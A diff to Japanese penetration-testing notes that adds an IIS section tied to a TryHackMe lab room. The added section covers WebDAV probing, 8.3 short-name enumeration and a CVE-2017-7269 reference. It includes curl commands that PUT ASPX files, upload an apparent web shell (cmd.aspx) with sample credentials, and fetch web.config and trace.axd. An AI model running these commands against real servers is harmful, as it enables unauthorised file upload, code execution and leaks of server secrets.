@@ -115,6 +115,40 @@ server accepts handled requests
 Reading: 0 Writing: 1 Waiting: 0
 ```
 
+## IIS
+
+https://tryhackme.com/room/webserverattacks2
+
+IIS/6.0 (Windows Server 2003) には [CVE-2017-7269](https://www.exploit-db.com/exploits/41992) の脆弱性があり、これに対する公式パッチはない。
+
+### WebDAV
+
+```sh
+# DAV:が表示される場合は WebDAV が有効になっている
+$ curl -X OPTIONS http://10.144.158.169/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
+< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+< DAV: 1,2,3
+
+# 書き込みを試す
+$ curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.144.158.169/webdav/test.aspx
+
+# 認証情報を使う
+$ curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.144.158.169/webdav/cmd.aspx
+```
+
+### 8.3 ショートファイル名
+
+NTFSではデフォルトで、長いファイル名のファイルに対して、先頭の6文字に ~1 (衝突する場合は ~2, ~3) を付けた別名を生成する。  
+例えば `BackupFiles/` というディレクトリが存在するとき、`BACKUP~1/` のリクエストに対して404が返されるが、でたらめなパスの場合の404と本文長が異なることにより隠れたディレクトリが存在することを推測できる。
+
+### 機密ファイル漏洩
+
+```sh
+curl http://10.144.158.169/web.config
+
+curl http://10.144.158.169/trace.axd
+```
+
 ## サーバー共通の設定ミス
 
 ### セキュリティヘッダー
